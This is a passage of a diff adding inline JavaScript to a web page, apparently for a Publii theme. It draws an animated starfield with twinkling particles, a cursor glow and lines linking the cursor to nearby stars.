+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
